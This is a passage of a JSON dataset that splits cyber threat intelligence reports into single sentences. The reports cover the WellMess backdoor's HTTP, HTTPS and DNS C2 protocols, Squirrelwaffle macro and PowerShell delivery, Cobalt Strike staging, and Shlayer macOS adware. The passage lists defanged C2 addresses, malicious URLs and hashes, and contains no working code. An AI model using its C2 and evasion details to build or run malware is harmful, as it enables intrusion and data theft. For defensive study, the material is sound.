        "id": "cti_reports_filtered/r-527.md:::S9",
        "text": "The three methods are:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S10",
        "text": "- HTTP",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S11",
        "text": "- HTTPS",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S12",
        "text": "- DNS\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S13",
        "text": "In this sample the DNS communication method is not enabled; however, the method has been documented for completeness as the functionality is present in the malware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S14",
        "text": "For each communication method the malware follows a similar process; it establishes a connection with the C2 and then enters an infinite loop to exchange data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S15",
        "text": "The details of the initial connection differ for each method but the main loop that exchanges data uses the same functions to carry out malicious functionality.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S16",
        "text": "The HTTP mode is the same communication method used in variants of the malware from 2018.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S17",
        "text": "Although it uses the non-encrypted HTTP protocol to communicate with the C2 it manually encrypts the contents of the requests to hide data from packet inspection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S18",
        "text": "The malware creates an AES session key and initial value (as detailed in Appendix C) which are base64 encoded, appended to each other with a \\n separator.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S19",
        "text": "Once appended, it is further encrypted with a hardcoded RSA public key and base64 encoded again and obfuscated before being sent to the C2 as the body of a POST request.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S20",
        "text": "The obfuscation routine used on the final base64 data removes and replaces characters in the base64 string, according to Table 1:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S21",
        "text": "The string is then chopped into randomly chosen 3-8 character chunks and each chunk is separated with a single space.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S22",
        "text": "The final string is then set as the content of a HTTP POST request to the hardcoded IP and port present in the malware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S23",
        "text": "The POST request also creates an obfuscated cookie to include in the POST request.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S24",
        "text": "The cookie is a string consisting of tags that contain information about the malware which is then RC6 encrypted with a hardcoded key, base64 encoded and split into random sized chunks.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S25",
        "text": "The first cookie sent to the C2 includes the previously generated MD5 session hash and has the following format before encryption:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S26",
        "text": "<;head;>md5_hash/p<;head;><;title;>a:1_0<;title;><;service;>p<;service;>",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S27",
        "text": "Encrypted cookies generated by the malware can be decrypted with a script[3] provided by JPCERT, so long as the RC6 key has been obtained for the sample that generated the cookie.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S28",
        "text": "Once the AES key and IV have been sent to the C2 the malware sends the userParameters string and the saved MD5 hash separated by a newline character in the same way.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S29",
        "text": "The only difference from the previous send is that the <;title;> tag contains the string a:1_1 this time.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S30",
        "text": "After the initial connection to the C2 has been established, the malware will repeatedly attempt to receive a command from the C2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S31",
        "text": "The communications follow the pattern shown in Figure 2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S32",
        "text": "The 2398 random bytes of data are base64 encoded and then obfuscated as detailed previously in Table 1.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S33",
        "text": "This data is then sent to the C2 with an RC6 encrypted cookie with the <;head;> tag containing the MD5 session hash value, the <;title;> tag containing the string rc and the <;service;> tag being present but empty.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S34",
        "text": "The malware expects the server to respond with a HTTP 200 OK response that contains an RC6 encrypted cookie in a similar format to the sent cookie.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S35",
        "text": "This is checked in the malware by parsing the received cookie data according to the following regex which also matches the format of the sent cookie data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S36",
        "text": "The cookie is used by the malware to determine what type of command has been received from the C2; Table 2 summarises the possible options.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S37",
        "text": "If the response from the C2 contains a value of p in the service tag received, then the malware will generate a new AES key and send it to the C2 in the same way as during the initial connection to the C2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S38",
        "text": "A value of G in the head tag will make the malware send the string \u201cMissed me? Interval=\u201d with the currently configured value that is used by the malware to calculate wait intervals when receiving this command.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S39",
        "text": "A value of C in the head tag will check a <;title;> tag for the number of chunks the C2 wants to send to the malware and will receive data and store it for later use until the title tag value in a received message matches the desired number of chunks from the C2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S40",
        "text": "This method will be used when the C2 wishes to send a large amount of data to the malware but does not want to alert network monitoring tools that a large data transfer is occurring.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S41",
        "text": "The service tag values, except for p, are used when interpreting the content of the data sent to the malware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S42",
        "text": "The content of the data is stored in the Content segment of the 200 OK responses from the C2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S43",
        "text": "The data in the content section is converted from the obfuscated format detailed in Table 1, base64 decoded and then decrypted using the AES key that was previously sent to the C2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S44",
        "text": "Once all the data has been received and decoded from the C2, the malware will call a function called botlib.Work which is responsible for the malicious behaviour of this malware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S45",
        "text": "This function handles the u, m, hi, fu, fd and pr service tags as well as having a default case where the service tag does not contain any data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S46",
        "text": "The fu commands take the contents of the response from the C2 as the file to write and parses the service tag for the file name and path to use.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S47",
        "text": "The service tag is expected to be in the following format:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S48",
        "text": "The tag is split using the \u2018|\u2019 character and if the filepath parameter is present, then the data is written to a file using that parameter as the file name and path.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S49",
        "text": "If the path is not present, then the malware instead writes the file to the current directory the malware is in with a file name of upload.filename.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S50",
        "text": "The fd command uses the same format to find the file to send to the C2; however, if the filepath parameter is not present the malware will look for a file in the current folder called download.filename.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S51",
        "text": "The pr command also utilises the \u2018|\u2019 as a separator with each protocol separated by the symbol.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S52",
        "text": "An example service tag that would enable all of the communication methods in the sample analysed would be:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S53",
        "text": "The default case when the service tag is empty allows the malware to treat the contents of the response from the C2 as a command to execute via the Go library functions os.exec.Command or os.exec.Start.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S54",
        "text": "The format of the received command is checked against the below regex pattern for validity before executing and the command is read from the body of the message received from the C2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S55",
        "text": "This method for running commands is slightly different from the older .NET variants of the backdoor which additionally supported running scripts via PowerShell.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S56",
        "text": "When the backdoor is configured to use HTTPS to communicate with the C2, the functionality is largely the same as when in HTTP mode.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S57",
        "text": "The differences are that it lacks the options to update a session key due to encryption being handled by the TLS layer and it also does not have the option to send data to and from the C2 in the chunking mode previously described.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S58",
        "text": "In addition, only one transmission is made to the C2 when the malware is establishing a connection as there is no exchange of an AES session key.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S59",
        "text": "The hello message that is sent contains the same plaintext data as the HTTP mode.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S60",
        "text": "However, the title tag has just the character a rather than a:1_1 that is used for the HTTP beacon.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S61",
        "text": "The communication pattern between the victim and the C2 also follows the same pattern as described in Figure 2 but the outer layers of obfuscating the data and RSA encryption are removed due to the TLS protocol handling the encryption.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S62",
        "text": "The malware secures the communications between itself and the C2 by implementing a feature called mutual TLS.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S63",
        "text": "Usually TLS operates in simple mode, which only requires a server to carry out authentication.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S64",
        "text": "Mutual TLS means the malware has a trusted SSL certificate hardcoded in its binary that it uses to check the certificate provided by the C2; the malware also forwards its own hardcoded certificate to the C2 that the C2 checks.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S65",
        "text": "So long as both the C2 and the malware accept the provided certificates then communications will be encrypted using TLS, otherwise the connection will be rejected and the malware will not be able to communicate with the C2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S66",
        "text": "When looking at the certificates embedded in the samples, it appears that the threat actor uses a self-signed certificate authority to sign both the C2 and the malware\u2019s certificates.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S67",
        "text": "The WellMess malware stores the C2 IP addresses it uses in the binary as a plaintext url.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S68",
        "text": "The format of the C2 url string for the example in Figure 3 would be one of:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S69",
        "text": "- hxxp[:]//45.152.84[.]57:port_number; or,",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S70",
        "text": "- hxxps[:]//45.152.84[.]57:port_number.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S71",
        "text": "This pattern can be used to identify numerous samples of the WellMess backdoor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S72",
        "text": "The DNS communication protocol is significantly different to the previous two modes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S73",
        "text": "Data is sent to the C2 by DNS tunnelling.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S74",
        "text": "This involves prepending encoded data as a sub domain to a threat actor-controlled domain and then using DNS requests to transmit this data to the C2 with other DNS resolution services forwarding on the message.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S75",
        "text": "The implementation of DNS tunnelling in this sample uses A records to send data to the C2 and then uses TXT records to receive commands during its main loop.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S76",
        "text": "The initial message sent to the C2 consists of the current time printed in DD/MM/YYYY HH:MM:SS AM/PM format.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S77",
        "text": "This is then encoded using a non-standard base32 encoding with an alphabet of ybndrfg8ejkmcpqxot1uwisza345h769.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S78",
        "text": "This time value is then used throughout the execution of the malware as part of the DNS beacon message to the C2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S79",
        "text": "The DNS method builds a URL string by splitting the encoded string into four parts of random length, separating each with a period.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S80",
        "text": "It then gzips and RC4 encrypts the previously generated MD5 hash string using a hardcoded key.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S81",
        "text": "As this sample did not have DNS functionality enabled, the key was not configured in this binary.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S82",
        "text": "The result of the RC4 operation is then encoded using the base32 encoding and then that is split into a period-separated string with each chunk a random length.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S83",
        "text": "If the result of the manipulation of the MD5 hash gave the string abcdefg12345, the resulting period separated string could end up being something like .ab.cde.fg12.245.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S84",
        "text": "Each chunk can have a maximum length of 12 characters.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S85",
        "text": "The previously encoded four-part message then has the command of this operation appended to it, in the initial beacon\u2019s case the command is id.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S86",
        "text": "That then has the MD5 string appended to it followed by the malicious domain.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S87",
        "text": "The whole message is then prepended with a sequence identifier in case the malware needs more than one DNS request to fit the information in.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S88",
        "text": "A couple of example strings with sections bolded to show the boundaries are included below to demonstrate the encoding:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S89",
        "text": "As can be seen in the above examples, even when the contents of the message change, the part of the URL relating to the MD5 hash remains consistent albeit with different length chunks for each send.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S90",
        "text": "When sending beacons during the main loop in DNS mode the malware will generate two base64 encoded strings from seven random bytes each and join them with a period to the command rc.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S91",
        "text": "It will then append the previously generated time string after separating it into four separate chunks.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S92",
        "text": "Finally, it will append another 10 base64 encoded strings, each generated from 7 random bytes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S93",
        "text": "Finally the C2 domain is appended to the string and this is sent to the C2 as a DNS TXT request.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S94",
        "text": "The response is expected to contain three TXT records.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S95",
        "text": "The first specifies the command that is being sent from the C2 and can be either of C or G.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S96",
        "text": "These commands operate in the same way described previously.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S97",
        "text": "If the first command does not match either of these values then the malware reads the data from the third TXT record, decodes it using the custom base32 algorithm, RC4 decrypts the result, then gzip decompresses the data to give the final data to be used.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S98",
        "text": "The commands expected in this data are either the pr command, as previously described, or a com command.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S99",
        "text": "The com option calls the same functions as the default case in the HTTP and HTTPS modes which allows the malware to run a cmd shell but then exfiltrates the output via DNS A records.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S0",
        "text": "Squirrelwaffle campaigns generally start via spam emails that attempt to convince victims to click an embedded URL using a technique known as email thread hijacking.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S1",
        "text": "Email thread hijacking leverages emails that have been stolen prior to the attack and later repurposed to dupe a victim into believing that an email is from someone that they know who is replying to the same thread.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S2",
        "text": "Once a victim clicks on the URL, a ZIP file is downloaded that contains a Microsoft Word document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S3",
        "text": "These documents follow a similar naming convention matching the regular expression diagram-\\d{2,3}.doc.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S4",
        "text": "For example, the file with an MD5 hash E599A656599A2680C9392C7329D9D519 has the filename diagram-346.doc.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S5",
        "text": "This document is using a DocuSign template lure that instructs the user to enable a macro to view the content (as shown in Figure 2).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S6",
        "text": "All the other documents analyzed by Zscaler ThreatLabz have exactly the same content with multiple modules that contain VBA code.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S7",
        "text": "Once the user enables the macro, an AutoOpen() subroutine is called which then executes a malicious Visual Basic Application (VBA) macro.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S8",
        "text": "Here, the AutoOpen() subroutine calls another function efile() in the bxh module.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S9",
        "text": "There is a UserForm object in the document which contains a VBS file named pin.vbs that is embedded in the caption of the DocuSign image.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S10",
        "text": "The document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S11",
        "text": "This VBS file contains an obfuscated PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S12",
        "text": "The payload is written to %ProgramData% with the filename ww1.dll.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S13",
        "text": "The VBS file simply uses the IEX (Invoke-Expression) function to download the Squirrelwaffle loader.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S14",
        "text": "The payload DLL is executed via rundll32.exe by invoking the export function name ldr.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S15",
        "text": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle are shown below:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S16",
        "text": "- hxxps://priyacareers[.]com/u9hDQN9Yy7g/pt.html",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S17",
        "text": "- hxxps://perfectdemos[.]com/Gv1iNAuMKZ/pt.html",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S18",
        "text": "- hxxps://bussiness-z[.]ml/ze8pCNTIkrIS/pt.html",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S19",
        "text": "- hxxps://cablingpoint[.]com/ByH5NDoE3kQA/pt.html",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S20",
        "text": "- hxxps://bonus.corporatebusinessmachines[.]co.in/1Y0qVNce/pt.html",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S21",
        "text": "The threat actor behind these campaigns has changed some of their TTPs over time.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S22",
        "text": "Recently, the initial infection vector has used hidden Microsoft Excel sheets with an Auto_Open() macro, which downloads the Squirrelwafle loader from three different URLs.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S23",
        "text": "The Squirrelwaffle loader is subsequently executed via regsvr32.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S24",
        "text": "An example for this campaign shown in Figure 6, used a Microsoft Excel document with the MD5 hash 77BD39191FDC817F2F14F0462BFF8D86 and a filename matching the regular expression diagram-\\d{1,9}.xls.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S25",
        "text": "The hidden sheet in this Excel document is shown in Figure 7.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S26",
        "text": "The extracted macro code is shown in Figure 8.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S27",
        "text": "The threat actor also changed the location where the payload is written to disk.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S28",
        "text": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle from this campaign are shown below:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S29",
        "text": "- hxxps://cortinastelasytrazos[.]com/Yro6Atvj/sec.html",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S30",
        "text": "- hxxps://orquideavallenata[.]com/4jmDb0s9sg/sec.html",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S31",
        "text": "- hxxps://fundacionverdaderosheroes[.]com/gY0Op5Jkht/sec.html",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S32",
        "text": "This analysis covers the Squirrelwaffle with the MD5 hash 479DAE0F72F4D57BD20E0BF8CB3EBDF7.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S33",
        "text": "Once the Squirrelwaffle payload is downloaded, it will either be executed via rundll32.exe or regsvr.exe depending upon the initial infection vector that was used to download the payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S34",
        "text": "Squirrelwaffle loader samples have a recent compilation date using Visual Studio 2017 as shown in Figure 9.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S35",
        "text": "The Squirrelwaffle loader is a 32-bit DLL, which is packed with a custom packer.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S36",
        "text": "Similar packers have been observed in other malware families including Ursnif and Zloader.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S37",
        "text": "Squirrelwaffle contains a hardcoded configuration that is encrypted in the binary.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S38",
        "text": "There are two main components: a list of CnC URLs and a list of IP addresses to block, which belong to sandboxes and analysis platforms.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S39",
        "text": "These lists are obfuscated using an XOR-based algorithm with hardcoded keys.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S40",
        "text": "An example formatted Squirrelwaffle configuration is shown in Figure 10.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S41",
        "text": "Once the malware decodes all of the CnC domains and IP addresses to block, it creates a socket and sends the data using the send() function and receives the content from the CnC using recv() calls.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S42",
        "text": "The CnC communication protocol utilizes an HTTP POST request with a Base64 encoded payload that is encrypted using an XOR-based algorithm with the hardcoded key KJKLO.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S43",
        "text": "An example HTTP POST request is shown below:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S44",
        "text": "Note that this request does not contain a User-Agent field in the HTTP header.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S45",
        "text": "The path of the HTTP POST request consists of a hardcoded prefix and a Base64 encoded string that is encrypted using the same XOR-based algorithm and key as described above.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S46",
        "text": "This encoded string includes an alphanumeric string with a random length between 1 and 28 characters followed by the IP address of the system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S47",
        "text": "Each field is delimited by a single tab character.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S48",
        "text": "An example before encryption is shown below:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S49",
        "text": "The HTTP POST body contains another Base64 encoded string that includes the victim\u2019s computer name, username, application data directory, and workgroup.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S50",
        "text": "Each field is delimited with two tab characters.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S51",
        "text": "An example payload before encryption is shown below:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S52",
        "text": "This payload is also encrypted with the same XOR-based algorithm and key as the HTTP POST path component.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S53",
        "text": "The SquirrelWaffle CnC responds with a Base64 encoded payload that uses the same encryption schema with another format that uses two tab characters as delimiter between fields.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S54",
        "text": "These fields include a status code, a timestamp, the external IP address of the system, along with the victim\u2019s system information that was previously sent.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S55",
        "text": "An example decrypted response is shown below:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S56",
        "text": "The SquirrelWaffle CnC response may also contain a second-stage payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S57",
        "text": "An example decrypted response is shown below:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S58",
        "text": "This second-stage payload will be written to a filename that consists of eleven random alphanumeric characters appended with a .txt extension, and then executed by SquirrelWaffle.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S59",
        "text": "Zscaler ThreatLabz has observed Squirrelwaffle deliver an executable file with the MD5 hash 116301FD453397FDF3CB291341924147.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S60",
        "text": "This file is packed and decrypted in memory to produce a Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the Cobalt Strike beacon.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S61",
        "text": "The Cobalt Strike stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S62",
        "text": "The Cobalt Strike CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S63",
        "text": "This binary data consists of shellcode that decrypts the Cobalt Strike beacon using the XOR-based algorithm replicated below in Figure 13.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S64",
        "text": "The Cobalt Strike beacon observed by Zscaler ThreatLabz contains the following CnC servers:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S65",
        "text": "- hxxps://systemmentorsec.com/jquery-3.3.1.min.js,",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S66",
        "text": "- hxxps://213.227.154.92/jquery-3.3.1.min.js",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S0",
        "text": "As with much of the currently distributed adware, this malware is typically delivered via drive-by advertisements, posing as a fake Adobe Flash or related software updates.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S1",
        "text": "Whether you receive the malware or a generic advertisement from the compromised domain depends on your browser\u2019s user-agent string, IP address, and relative last visit.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S2",
        "text": "Given this determination, TAU developed a script to rotate through proxies, visit the main advertisement domain (in this example case, dubbeldachs[.]com), follow through all redirects, detect if the site is malicious or not, capture a screenshot + page source + malware payload, and categorize the data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S3",
        "text": "Below is a sample screenshot of this script in action:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S4",
        "text": "Running this script across multiple systems, we were able to capture over 50 unique samples in a matter of hours, all targeted towards macOS.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S5",
        "text": "In total at that time, there were well over 5,000 unique hashes confirmed, meaning that banning via hash would be ineffective due to the rate at which binaries are re-compiled or otherwise modified.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S6",
        "text": "The following screenshot illustrates a sample delivery site typical of Shlayer (and other adware):\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S7",
        "text": "In addition to malicious DMG / ISO / PKG downloaders, various redirects contained browser extensions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S8",
        "text": "All infection vectors required user interaction at some level in order to compromise the host, including installation of software packages and authentication.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S9",
        "text": "Although the distribution sites vary in theme and delivery method, we observed the resulting payload ultimately installed a variant of Shlayer.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S10",
        "text": "Samples discovered by TAU have been seen to affect versions of macOS from 10.10.5 to 10.14.3 as of December 2019.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S11",
        "text": "To this point, all discovered samples of this malware have targeted only macOS.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S12",
        "text": "The malware employs multiple levels of obfuscation and is capable of privilege escalation.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S13",
        "text": "Many of the initial DMGs are signed with a legitimate Apple developer ID and use legitimate system applications via bash to conduct all installation activities.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S14",
        "text": "Although most samples were DMG files, we also discovered .pkg, .iso, and .zip payloads.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S15",
        "text": "The following analysis results reflect execution of a DMG-based payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S16",
        "text": "Note: There are many other samples found by TAU that appear to be variations of this malware, masquerading as pirated software \u2013 these variations may have different application paths.",
        "type": ""
    },
    {
